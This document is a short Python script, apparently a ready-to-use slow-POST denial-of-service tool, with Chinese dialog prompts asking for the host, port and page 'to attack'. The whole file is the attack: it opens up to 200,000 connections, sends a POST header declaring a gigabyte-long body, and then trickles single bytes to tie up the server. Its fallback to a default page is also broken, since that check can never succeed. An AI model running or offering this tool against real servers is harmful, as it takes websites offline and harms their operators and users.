import socket
import threading
import easygui
# zh-cn
#---------------------------
MAX_CONN=200000
PORT=int(easygui.enterbox(title='提示', msg='请输入要攻击的远程主机的端口'))
HOST=easygui.enterbox(title='提示', msg='请输入要攻击的远程主机的域名或ip地址')
PAGE='/{0}'.format(easygui.enterbox(title='提示', msg='请输入要攻击的页面(如果不输入，默认为index.html)'))
if PAGE == None:
    PAGE = 'index.html'
easygui.msgbox(title='警告', msg='即将开始攻击，产生的后果请自负!')
#---------------------------
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode("utf-8"))
            print("[+] Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s"%ex)
        
#end def
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(bytes("f", 'utf8'))
                print("[+] send OK! %s"%s)
            except Exception as ex:
                print("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
                
#end def
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()

